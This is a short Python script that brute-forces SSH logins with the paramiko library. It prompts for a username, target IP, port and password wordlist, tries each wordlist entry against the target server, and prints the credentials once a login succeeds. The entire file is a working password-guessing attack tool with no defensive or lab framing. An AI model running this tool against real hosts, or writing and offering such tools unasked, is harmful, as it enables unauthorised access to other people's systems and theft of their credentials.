#!/usr/bin/env python
import os
import sys
import paramiko

password = "none"

def brute_force(username,host,port,wordlist):
    print("Beginning attack on target:{} at port:{} with wordlist:{}".format(host,port,wordlist))

    wordlist_file = open(wordlist,"r")

    for line in wordlist_file.readlines():
        try:    
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=port, username=username, password=line.strip())            
            ssh.close()
            global password
            password = line.strip()
            
            print("\n" + "="*50)
            print("Login Success!!! \nusername:{} \npassword:{}".format(username,line))
            print("="*50)
            return
        
        except (paramiko.AuthenticationException) as e:
            print("Login failed with: \nusername:{} \npassword:{} \nerror:{}".format(username,line,e))
            continue
        
        except(paramiko.BadHostKeyException) as e:
            print("Login failed with: \nusername:{} \npassword:{} \nerror:{}".format(username,line,e))
            continue
        except(paramiko.SSHException) as e:
            print("Login failed with: \nusername:{} \npassword{} \n error:{}".format(username,line,e))
            continue

def main():
  try:    
    user = input("Enter username: ")
    target_ip = input("Enter target IP address: ")
    port_num = input("Enter port number: ")
    wordlist_path = input("Enter wordlist/wordlist file path: ")
     
    if os.path.exists(wordlist_path):
         brute_force(user,target_ip,port_num,wordlist_path)
    else:
         print("invalid wordlist")
  
  
  except KeyboardInterrupt:
    print("Exiting...")
    sys.exit()
    


if __name__ == "__main__":
    main()